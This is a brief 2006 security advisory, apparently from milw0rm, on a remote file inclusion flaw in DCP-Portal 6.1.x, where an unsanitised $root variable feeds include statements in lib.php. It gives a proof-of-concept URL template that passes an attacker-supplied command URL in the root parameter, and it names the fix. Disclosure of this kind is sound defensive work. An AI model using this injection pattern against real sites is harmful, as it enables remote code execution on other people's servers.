<html><head><title>DCP-Portal 6.1.x (root) Remote File Include Vulnerability</title></head><pre>-----------------------------------------------------
Advisory id: FSA:013

Author:    Federico Fazzi
Date:      12/06/2006, 9:31
Sinthesis: DCP-Portal 6.1.x, Remote command execution
Type:      high
Product:   http://www.dcp-portal.org/
Patch:     unavailable
-----------------------------------------------------


1) Description:

Error occured in lib.php, line 4/7:

include (&quot;$root/library/lib_nav.php&quot;);
include (&quot;$root/library/lib_mods.php&quot;);
include (&quot;$root/library/lib_admin.php&quot;);
include (&quot;$root/library/lib_3rd.php&quot;);

variable $root not sanitized (declare).

2) Proof of concept:

http://example/[dp_path]/library/lib.php?root=[cmd_url]

3) Solution:

declare $root variable on this file.

# milw0rm.com [2006-06-12]</pre></html>